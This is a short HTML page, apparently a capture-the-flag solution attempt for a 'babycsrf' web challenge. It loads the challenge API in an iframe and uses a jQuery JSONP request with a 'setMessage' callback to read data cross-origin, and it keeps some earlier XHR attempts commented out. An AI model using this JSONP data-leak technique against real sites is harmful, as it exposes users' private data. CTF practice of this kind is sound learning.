<!DOCTYPE html>
<html>
    <script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
    <body>
        Challenge Solution HTML
        <p id="demo">

        </p>
        <iframe id="my_frame" src="https://babycsrf-web.chal.irisc.tf/api" frameborder="0"></iframe>
    </body>
    <script>
        // var xhttp = new XMLHttpRequest();
        
        // xhttp.onreadystatechange = function() {
        //     if (this.readyState == 4 && this.status == 200) {
        //     // Typical action to be performed when the document is ready:
        //     document.getElementById("demo").innerHTML = xhttp.responseText;
        //     }
        // };
        // xhttp.open("GET", "https://babycsrf-web.chal.irisc.tf/api", true);
        // xhttp.setRequestHeader('Access-Control-Allow-Origin', '*');
        // xhttp.send();

        // var answer = $("#my_frame").contents().find("body").text();
        // console.log(answer)

        $.ajax({
            url:'https://babycsrf-web.chal.irisc.tf',
            method:'GET',
            dataType: "jsonp",  
            jsonp: "setMessage", 
            headers: {
            'Access-Control-Allow-Origin': '*'
            },
            success:function(res){console.log(res)},
            error:function(err){console.log(err)},
            });
            // $('#my_frame').on( 'load', function() {
            //     var answer = $("#my_frame").contents();
            //     console.log(answer)
            // code will run after iframe has finished loading
        // } );
    </script>
</html>
